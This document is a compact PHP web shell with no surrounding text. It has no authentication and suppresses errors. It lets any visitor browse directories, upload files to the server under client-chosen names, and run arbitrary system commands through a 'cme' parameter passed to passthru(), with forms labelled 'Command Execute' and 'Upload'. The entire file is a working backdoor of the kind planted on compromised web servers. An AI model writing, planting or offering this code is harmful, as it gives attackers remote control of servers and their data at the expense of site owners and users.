<?php
error_reporting(0);set_magic_quotes_runtime(0);if(strtolower(substr(PHP_OS, 0, 3)) == "win"){$s="\\";}else{$s="/";}$ad=$_REQUEST['ad'];
if ($ad){chdir($ad);}else{$ad=getcwd();}if ($_FILES["ff"]){move_uploaded_file($_FILES["ff"]["tmp_name"], $_FILES["ff"]["name"]);}
if ($hr = opendir($ad)) {while($f = readdir($hr)){if(is_dir($f)){$df=$df.$f.'
';}else{$lf=$lf.$f.'
';}}closedir($hr);}$form='<form action="'.$_SERVER['PHP_SELF'].'" method=get>';echo '<center><textarea cols=90 rows=20>';if($_GET['cme']){passthru($_GET['cme']);}else{echo $df.$lf;};echo'</textarea>'.$form.'Change Dir : <input name=ad size=50 value='.getcwd().$s.'><input type=submit value=Go></form>'.$form.'Command Execute : <input name=cme size=50 value=id> <input type=submit value=eXecute></form><form action="'.$me.'" method=post enctype=multipart/form-data>Upload : <input size=50 type=file name=ff > <input type=hidden name=ad value='.getcwd().'><input type=submit value=Send></form><br>';
?>